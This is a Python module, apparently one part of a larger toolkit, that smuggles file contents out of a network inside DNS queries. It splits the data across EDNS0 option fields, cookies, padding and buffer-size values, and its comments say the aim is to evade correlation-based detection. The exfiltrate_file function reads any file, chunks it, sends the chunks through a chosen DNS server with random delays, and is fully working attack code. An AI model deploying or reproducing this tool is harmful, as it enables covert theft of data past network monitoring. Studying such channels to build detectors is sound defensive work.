#!/usr/bin/env python3
"""
T6: Hybrid Multi-Field
Combina múltiplas técnicas em uma única transação DNS.
Dificulta detecção por correlação.
"""

import struct
import time
import random

from scapy.all import IP, UDP, send, RandShort
from scapy.layers.dns import DNS, DNSQR, DNSRROPT, EDNS0TLV

from . import t1_opt_option, t2_padding, t3_cookie, t4_bufsize


def build_hybrid_query(domain: str, payload: bytes,
                       dns_server: str,
                       techniques: list = None):
    """Combinar múltiplas técnicas em uma query.

    Exemplo de distribuição:
    - T4: sinalização de estado (buffer size)
    - T3: primeiros 24 bytes no server cookie
    - T1: restante dos dados em OPT experimental
    """
    if techniques is None:
        techniques = ['t1', 't3', 't4']

    opts = []
    buf_size = 4096  # default
    offset = 0

    # T4: sinalização via buffer size
    if 't4' in techniques:
        buf_size = t4_bufsize.encode_signal('EXFIL_START')

    # T3: dados no cookie (até 24 bytes úteis)
    if 't3' in techniques and offset < len(payload):
        cookie_data = payload[offset:offset + 24]
        opts.append(t3_cookie.encode_data(cookie_data))
        offset += 24

    # T1: restante em OPT experimental
    if 't1' in techniques and offset < len(payload):
        remaining = payload[offset:]
        opts.append(t1_opt_option.encode_data(remaining))
        offset += len(remaining)

    # T2: padding com dados adicionais (se necessário)
    if 't2' in techniques and offset < len(payload):
        pad_data = payload[offset:]
        opts.append(t2_padding.encode_data(pad_data))

    # Construir pacote
    pkt = (
        IP(dst=dns_server) /
        UDP(dport=53, sport=RandShort()) /
        DNS(
            rd=1,
            qd=DNSQR(qname=domain, qtype='A'),
            ar=DNSRROPT(rclass=buf_size, rdata=opts)
        )
    )

    return pkt


def decode_data(pkt) -> dict:
    """Decodificar dados de todas as técnicas presentes"""
    from scapy.layers.dns import DNSRROPT

    results = {
        'techniques_found': [],
        'data_fragments': [],
        'total_bytes': 0
    }

    if pkt.haslayer(DNSRROPT):
        opt = pkt[DNSRROPT]

        # Verificar buffer size (T4)
        signal = t4_bufsize.decode_signal(opt.rclass)
        if not signal.startswith('UNKNOWN'):
            results['techniques_found'].append('t4')
            results['signal'] = signal

        # Verificar cada TLV
        if hasattr(opt, 'rdata') and opt.rdata:
            for tlv in opt.rdata:
                if 65001 <= tlv.optcode <= 65534:
                    results['techniques_found'].append('t1')
                    results['data_fragments'].append(tlv.optdata)
                elif tlv.optcode == 12:
                    results['techniques_found'].append('t2')
                    results['data_fragments'].append(tlv.optdata)
                elif tlv.optcode == 10:
                    results['techniques_found'].append('t3')
                    if len(tlv.optdata) > 8:
                        results['data_fragments'].append(
                            tlv.optdata[8:])

    results['total_bytes'] = sum(
        len(f) for f in results['data_fragments'])

    return results


def exfiltrate_file(filepath: str, domain: str,
                    dns_server: str,
                    techniques: list = None,
                    chunk_size: int = 512):
    """Exfiltrar arquivo usando técnica híbrida"""
    if techniques is None:
        techniques = ['t1', 't3', 't4']

    with open(filepath, 'rb') as f:
        data = f.read()

    total_chunks = (len(data) + chunk_size - 1) // chunk_size

    for i in range(0, len(data), chunk_size):
        chunk = data[i:i + chunk_size]

        header = struct.pack('!HH', i // chunk_size, total_chunks)
        payload = header + chunk

        subdomain = f"h{i // chunk_size}.{domain}"
        pkt = build_hybrid_query(subdomain, payload, dns_server, techniques)
        send(pkt, verbose=0)

        time.sleep(random.uniform(0.1, 0.5))

    print(f"[T6] Exfiltrado: {filepath} ({len(data)} bytes, "
          f"{total_chunks} chunks, techniques={techniques})")
